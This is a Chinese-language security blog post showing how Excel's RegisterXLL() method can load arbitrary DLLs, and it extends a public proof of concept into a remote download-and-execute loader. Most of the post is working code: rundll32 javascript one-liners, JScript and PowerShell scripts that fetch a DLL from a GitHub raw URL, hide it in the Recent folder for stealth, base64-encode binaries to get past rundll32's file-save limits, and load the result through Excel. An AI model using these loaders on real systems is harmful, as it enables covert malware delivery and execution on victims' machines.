---
layout: post
title: Use Excel.Application object's RegisterXLL() method to load dll
---


## 0x00 前言
---

Ryan Hanson‏@ryHanson最近分享了一个技巧，利用`Excel.Application object's RegisterXLL()`能够加载dll。我对其分享的POC作了测试，接着做了扩展，添加功能实现远程下载执行，并且分析该方法相关的利用技巧，详细介绍脚本开发中的细节。


## 0x01 简介
---

本文将要介绍如下内容：

- POC测试
- 添加功能实现远程下载执行
- 扩展用法1：通过powershell实现
- 扩展用法2：结合rundll32使用

## 0x02 POC测试
---

**POC地址如下：**

https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52

前提是系统已安装Microsoft Office软件，共提供三种利用方式


### 1.rundll32

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";x=new%20ActiveXObject('Excel.Application');x.RegisterXLL('C:\\test\\messagebox.dll');this.close();
```

### 2.js

```
var excel = new ActiveXObject("Excel.Application");
excel.RegisterXLL("C:\\test\\messagebox.dll");
```

### 3.powershell

```
$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application"))
$excel.RegisterXLL("C:\test\messagebox.dll")
```

**注：**

测试的messagebox.dll来自于：https://github.com/3gstudent/test/blob/master/msg.dll

大小3kb，源代码及编译方法可参照文章[《Use Office to maintain persistence》](https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/)

## 0x03 添加功能
---

### Jscript基础知识：

**1、输出内容**

js代码如下：

```
WScript.Echo("1");
```

直接执行js脚本会弹框

cmd执行：`cscript.exe msg.js`，控制台输出1

**2、特殊目录**

输出当前用户的临时目录：

```
WScript.Echo(WScript.CreateObject("WScript.Shell").Environment("USER")("TEMP"));
```

输出Recent目录：

```
WScript.Echo(WScript.CreateObject("WScript.Shell").SpecialFolders("Recent");
```

即`%AppData%\Microsoft\Windows\Recent`（该目录后文会用到）

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-20/2-1.png)

添加文件名并输出：

```
WScript.Echo(WScript.CreateObject("WScript.Shell").SpecialFolders("Recent")+"\\msg.dll");
```

### 对原POC添加功能：

**1、判断是否安装Microsoft Office**

通过判断是否存在Microsoft Office默认安装文件夹实现

查找文件夹：

`"c:\Program Files\Microsoft Office"`

对应js代码如下：

```
var FileSys = WScript.CreateObject("Scripting.FileSystemObject");   
if (FileSys.FolderExists("c:\\Program Files\\Microsoft Office"))   
{   
	WScript.Echo("[+] Find Microsoft Office.");   
}
else
{
	WScript.Echo("[!] I can't find Microsoft Office!");    
}
```


**2、从Github下载dll文件并保存至Recent目录**

**方式1:** 使用Msxml2.XMLHTTP

```
var sGet=new ActiveXObject("ADODB.Stream");
var xGet=null;
xGet=new ActiveXObject("Msxml2.XMLHTTP");
xGet.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calc.dll",0);
xGet.Send();
sGet.Type=1;
sGet.Open();
sGet.Write(xGet.ResponseBody);
sGet.SaveToFile((WScript.CreateObject("WScript.Shell").SpecialFolders("Recent")+"\\calc.dll"),2);
```


**方式2:** 使用WinHttp.WinHttpRequest.5.1

```
h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calc.dll",false);
h.Send();
s=new ActiveXObject("ADODB.Stream");
s.Type=1;
s.Open();
s.Write(h.ResponseBody);
x=new ActiveXObject("WScript.Shell").SpecialFolders("Recent")+"\\calc.dll";
s.SaveToFile(x，2);
```


两种js方式均可以，但是在rundll32下使用的话，需要使用方式2，原因如下：

不支持`WScript.CreateObject("WScript.Shell")`，需要换成`new%20ActiveXObject("WScript.Shell")`

cmd执行：

`rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";xGet=new%20ActiveXObject("Msxml2.XMLHTTP");xGet.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calc.dll",0);xGet.Send();`

提示权限不够，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-20/2-2.png)

**注：**

选择保存在Recent目录是为了提高隐蔽性

保存在Recent目录，通过explorer.exe无法查看下载的dll，详情如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/ExcelDllLoader/master/1.gif)

但在cmd下能够查看下载的dll，详情如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/ExcelDllLoader/master/3.png)

在其他目录不存在这个问题，详情如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/ExcelDllLoader/master/2.gif)

为保证js和rundll32利用代码格式对应，原js代码作相应优化，最终代码为：

```
FileSys = WScript.CreateObject("Scripting.FileSystemObject");   
if (FileSys.FolderExists("c:\\Program Files\\Microsoft Office"))   
{   
	WScript.Echo("[+] Find Microsoft Office."); 
	WScript.Echo("[+] Download file...");
	h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
	h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calc.dll",false);
	h.Send();
	s=new ActiveXObject("ADODB.Stream");
	s.Type=1;
	s.Open();
	s.Write(h.ResponseBody);
	x=new ActiveXObject("WScript.Shell").SpecialFolders("Recent")+"\\calc.dll";
	s.SaveToFile(x,2);

	WScript.Echo("[+] Download Success.");
	WScript.Echo("[+] Load dll...");	 
	e= new ActiveXObject("Excel.Application");
	e.RegisterXLL(x);
	WScript.Echo("[+] Load dll Success.");	  
}
else
{
	WScript.Echo("[!] I can't find Microsoft Office!");  	   
}
```

**注：**

相关代码已上传至Github，完整POC可参照：

https://github.com/3gstudent/ExcelDllLoader

## 0x04 扩展用法
---

### 1、通过powershell实现

```
$path=$env:APPDATA+"\Microsoft\Windows\Recent\calc.dll"
$client = new-object System.Net.WebClient
$client.DownloadFile('https://raw.githubusercontent.com/3gstudent/test/master/calc.dll', $path)
$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application"))
$excel.RegisterXLL($path)
```

**注：**

该代码缺少判断MicrosoftOffice是否安装的功能

### 2、结合rundll32使用

需要注意如下细节：

- 空格用%20表示
- 为避免执行后弹框，需要加入语句document.write();

否则，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-20/2-22.png)

使用ADODB.Stream保存文件，会报错,测试代码如下：

`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calc.dll",false);h.Send();s=new%20ActiveXObject("ADODB.Stream");s.Type=1;s.Open();s.Write(h.ResponseBody);x=new%20ActiveXObject("WScript.Shell").SpecialFolders("Recent")+"\\calc.dll";s.SaveToFile(x,2);`


提示因为安全设置导致无法保存文件，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-20/2-3.png)


换用Scripting.FileSystemObject，能够保存文本文件，但是不支持二进制文件

保存文本文件,测试代码如下：

`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/version.txt",false);h.Send();s=new%20ActiveXObject("Scripting.FileSystemObject");f=s.CreateTextFile("c:\\test\\1.txt",true);f.WriteLine(h.ResponseText);f.Close();`

保存二进制文件，测试代码如下：

`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calc.dll",false);h.Send();s=new%20ActiveXObject("Scripting.FileSystemObject");f=s.CreateTextFile("c:\\test\\1.txt",true);f.WriteLine(h.ResponseText);f.Close();`

报错，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-20/2-4.png)

**解决方法：**

将二进制文件作base64编码并保存成文本文件，再通过Scripting.FileSystemObject保存


对calc.dll作base64编码并保存至文件buffer.txt,对应powershell代码如下：

```
$fileContent = [System.IO.File]::ReadAllBytes('calc.dll')
$fileContentEncoded = [System.Convert]::ToBase64String($fileContent)| set-content ("buffer.txt") 
```

**注：**

读取二进制文件，不能使用命令Get-content

将buffer.txt上传至github

下载base64并保存文件对应的js代码如下：

```
h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calcbase64.txt",false);
h.Send();
fso1=new ActiveXObject("Scripting.FileSystemObject");
f=fso1.CreateTextFile("c:\\test\\1.txt",true);
f.WriteLine(h.ResponseText);
f.Close();
```

下载base64并保存文件对应rundll32的代码如下：

`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calcbase64.txt",false);h.Send();s=new%20ActiveXObject("Scripting.FileSystemObject");f=s.CreateTextFile("c:\\test\\1.txt",true);f.WriteLine(h.ResponseText);f.Close();`

文件保存成功，该文件存储base64加密后的calc.dll

base64解密该文件并加载dll对应的js代码如下：

```
x="c:\\test\\calc.dll";
h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calcbase64.txt",false);
h.Send();
var enc = new ActiveXObject("System.Text.ASCIIEncoding");
var length = enc.GetByteCount_2(h.ResponseText);
var ba = enc.GetBytes_4(h.ResponseText);
var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
ba = transform.TransformFinalBlock(ba, 0, length);
s=new ActiveXObject("ADODB.Stream");
s.Type=1;
s.Open();
s.Write(ba);	
s.SaveToFile(x,2);
new ActiveXObject("Excel.Application").RegisterXLL(x);
```

**注：**

以上两段代码结合，可应用在通过rundll32进行文件下载（先通过rundll32下载base64加密的文件，然后使用js脚本解密），可解决在之前的文章《JavaScript backdoor》给读者留下的小bug


base64解密该文件并加载dll对应的powershell代码如下：

```
$FilePath="C:\test\test1.dll"
$base64Buf = Get-content c:\test\1.txt
$fileContentBytes = [System.Convert]::FromBase64String($base64Buf) 
[System.IO.File]::WriteAllBytes($FilePath,$fileContentBytes)
$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application"))
$excel.RegisterXLL($FilePath)
```


## 0x05 小结
---

本文介绍了利用Excel.Application object's RegisterXLL() method加载dll的相关方法，着重分析如何编写js和powershell脚本对其扩展，并解决了在之前的文章《JavaScript backdoor》给读者留下的小bug。

---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)





